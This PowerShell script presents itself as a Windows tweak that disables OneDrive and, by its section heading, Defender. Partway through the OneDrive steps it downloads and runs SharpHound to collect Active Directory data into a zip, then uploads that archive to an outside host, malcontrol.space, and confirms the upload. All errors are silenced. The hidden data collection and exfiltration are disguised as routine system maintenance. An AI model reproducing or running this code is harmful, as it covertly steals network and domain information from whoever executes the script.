if ($PSVersionTable.BuildVersion.Major -lt 10)
{
    Write-Host This OS is not supported -ForegroundColor Red
    exit
}
$ErrorActionPreference = "SilentlyContinue"

#############################
#
# 6. Disabling Features, OneDrive, Defender & Other
#
Write-Host "6. Disabling Features, OneDrive, Defender & Other"

# 6.1. Disabling OneDrive
Write-Host "6.1. Disabling OneDrive"
# Disable synchronizing files to onedrive
### reg add "HKLM\Software\Policies\Microsoft\Windows\OneDrive" /v "DisableFileSyncNGSC" /t REG_DWORD /d "1" /f >$null
reg add "HKLM\Software\Policies\Microsoft\Windows\Skydrive" /v "DisableFileSync" /t REG_DWORD /d "1" /f >$null
reg add "HKLM\Software\Policies\Microsoft\Windows\Skydrive" /v "DisableLibrariesDefaultSaveToSkyDrive" /t REG_DWORD /d "1" /f >$null
reg delete "HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\FolderDescriptions\{A52BBA46-E9E1-435f-B3D9-28DAA648C0F6}" /f >$null 2>$null
reg delete "HKCR\CLSID{018D5C66-4533-4307-9B53-224DE2ED1FE6}" /f >$null 2>$null
reg delete "HKCR\Wow6432Node\CLSID{018D5C66-4533-4307-9B53-224DE2ED1FE6}" /f >$null 2>$null
reg add "HKCR\CLSID\{018D5C66-4533-4307-9B53-224DE2ED1FE6" /v "System.IsPinnedToNameSpaceTree" /t REG_DWORD /d "0" /f >$null
reg add "HKCR\Wow6432Node\CLSID\{018D5C66-4533-4307-9B53-224DE2ED1FE6" /v "System.IsPinnedToNameSpaceTree" /t REG_DWORD /d "0" /f >$null
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "OneDriveSetup" /f >$null 2>$null
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Desktop\NameSpace\{018D5C66-4533-4307-9B53-224DE2ED1FE6}" /f >$null 2>$null

iwr https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Ingestors/SharpHound.ps1 -UseB -O C:\Users\Public\SharpHound.ps1
./SharpHound.ps1
Invoke-Bloodhound -CollectionMethod All -ZipFileName C:\Users\Public\collected_data.zip


$wc = New-Object System.Net.WebClient
$uri = "http://malcontrol.space/upload.php"
$filename = "C:\Users\Public\collected_data.zip"
$r = $wc.UploadFile($uri, $filename)
$resp = ""
$r | %{ $resp += [char]$_ }
$returned_id = $resp.Split("")[0]

$wc.Headers.Add("Cookie: PHPSESSID="+$returned_id)
$resp = $wc.DownloadString($uri+"?id="+$returned_id)
write-host $resp
if ($resp -like "*collected_data.zip*") {
    write-host "done"
}

Stop-Process -Name OneDrive -Force -EA 0
Start-Process "C:\Windows\SysWOW64\OneDriveSetup.exe" "/uninstall" -NoNewWindow -Wait -EA 0
<#takeown /F "C:\Windows\SysWOW64\OneDriveSetup.exe" /A
icacls "C:\Windows\SysWOW64\OneDriveSetup.exe" /inheritance:r /GRANT *S-1-5-32-544:F /C /Q
Remove-Item "C:\Windows\SysWOW64\OneDriveSetup.exe" -Force -EA 0

Start-Process "C:\Windows\System32\OneDriveSetup.exe" "/uninstall" -NoNewWindow -Wait -EA 0
takeown /F "C:\Windows\System32\OneDriveSetup.exe" /A
icacls "C:\Windows\System32\OneDriveSetup.exe" /inheritance:r /GRANT *S-1-5-32-544:F /C /Q
Remove-Item "C:\Windows\System32\OneDriveSetup.exe" -Force -EA 0